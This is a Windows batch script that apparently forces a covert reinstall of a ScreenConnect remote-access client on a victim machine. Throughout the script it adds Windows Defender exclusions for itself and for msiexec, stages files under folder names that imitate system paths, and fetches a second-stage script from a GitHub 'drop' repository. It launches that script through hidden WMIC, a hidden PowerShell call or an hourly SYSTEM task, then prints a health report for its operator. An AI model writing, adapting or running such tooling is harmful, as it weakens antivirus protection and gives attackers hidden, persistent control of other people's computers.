@echo off
rem OWN_GRYXA_FORCE BUILD 20260804F8 - REINSTALL breakaway (wmic plain path + PS Start-Process + minute task)
rem F8: wmic failed on escaped quotes; schtasks ONCE stays Queued — use MINUTE+/Run.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\own_gryxa_force.log"
set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
set "TASK=WucacheGryxaReinstall"
set "BUILD=F8"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] force_begin build=%BUILD% host=%COMPUTERNAME%>>"%LOG%"

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

set "NEED_G=1"
if exist "%WD%\own_gryxa.cmd" (
  findstr /C:"OWN_GRYXA BUILD 20260804G5" "%WD%\own_gryxa.cmd" >nul 2>&1
  if not errorlevel 1 set "NEED_G=0"
)
if "%NEED_G%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
)

if not exist "%WD%\own_gryxa.cmd" (
  echo BUILD=%BUILD%
  echo HOST=%COMPUTERNAME%
  echo HEALTH=FAIL
  echo REASON=no-own_gryxa
  echo REPORT %COMPUTERNAME% %FP% FAIL no-own_gryxa
  endlocal & exit /b 2
)

findstr /C:"REINSTALL" "%WD%\own_gryxa.cmd" >nul 2>&1
if errorlevel 1 (
  echo BUILD=%BUILD%
  echo HOST=%COMPUTERNAME%
  echo HEALTH=FAIL
  echo REASON=own_gryxa-not-G5
  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G5
  endlocal & exit /b 3
)

set "PRE=ABSENT"
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
)

if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
schtasks /Delete /TN "%TASK%" /F >nul 2>&1

> "%WORKER%" (
  echo @echo off
  echo echo [%DATE% %TIME%] reinstall_begin^>^>"%LOG%"
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
  echo echo [%DATE% %TIME%] reinstall_done err=%%ERRORLEVEL%%^>^>"%LOG%"
  echo schtasks /Delete /TN "%TASK%" /F ^>nul 2^>^&1
)

set "ACTION=fail"
rem 1) wmic with NO nested quotes (F7 escaping broke ProcessId)
wmic process call create "cmd.exe /c %WORKER%" >"%STAGE%\wmic_create.out" 2>&1
findstr /I "ProcessId =" "%STAGE%\wmic_create.out" >nul
if not errorlevel 1 (
  set "ACTION=wmic-reinstall"
  goto :Report
)

rem 2) PowerShell Start-Process breakaway
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c','%WORKER%' -WindowStyle Hidden" >nul 2>&1
if not errorlevel 1 (
  set "ACTION=ps-start-reinstall"
  goto :Report
)

rem 3) schtasks MINUTE (can /Run on demand; ONCE stays Queued)
schtasks /Create /TN "%TASK%" /TR "cmd.exe /c %WORKER%" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Run /TN "%TASK%" >nul 2>&1
set "ACTION=schtasks-minute-run"

:Report
echo [%DATE% %TIME%] launched ACTION=!ACTION! pre=%PRE%>>"%LOG%"

set "STATE=ABSENT"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "STATE=ABSENT"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" >nul && set "STATE=RUNNING"
  if /I not "!STATE!"=="RUNNING" sc query "%SVC%" | findstr /I /C:"START_PENDING" >nul && set "STATE=START_PENDING"
  if /I not "!STATE!"=="RUNNING" if /I not "!STATE!"=="START_PENDING" sc query "%SVC%" | findstr /I /C:"STOPPED" >nul && set "STATE=STOPPED"
)

set "HEALTH=QUEUED"
if /I "!ACTION!"=="fail" set "HEALTH=FAIL"
set "DIR=0"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"

echo.
echo ====== GRYXA REPORT ======
echo BUILD=%BUILD%
echo HOST=%COMPUTERNAME%
echo FP=%FP%
echo PRE=%PRE%
echo STATE=!STATE!
echo HEALTH=!HEALTH!
echo DIR=!DIR!
echo ACTION=!ACTION!
echo REPORT %COMPUTERNAME% %FP% !HEALTH! state=!STATE! dir=!DIR! pre=%PRE% action=!ACTION!
echo ==========================
echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"
type "%STAGE%\wmic_create.out" >>"%LOG%" 2>nul
endlocal & exit /b 0
